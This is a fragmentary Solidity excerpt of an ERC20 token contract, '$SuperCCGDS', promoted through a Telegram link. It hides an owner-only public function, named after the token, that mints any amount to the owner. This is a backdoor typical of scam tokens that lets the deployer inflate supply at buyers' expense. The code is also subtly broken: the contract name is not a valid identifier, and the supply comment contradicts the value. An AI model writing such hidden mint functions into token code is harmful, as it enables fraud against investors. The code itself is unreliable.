...
//
// $SuperCCGDS proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SuperCCGDS
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SuperCCGDS(uint256 amount) public onlyOwner {
 _SuperCCGDS(msg.sender, amount);
    }
    ...
    function _SuperCCGDS(address account, uint256 amount) internal virtual {
...
contract $SuperCCGDS is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Super CCGDS", "SCCGDS") {
     _SuperCCGDS(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}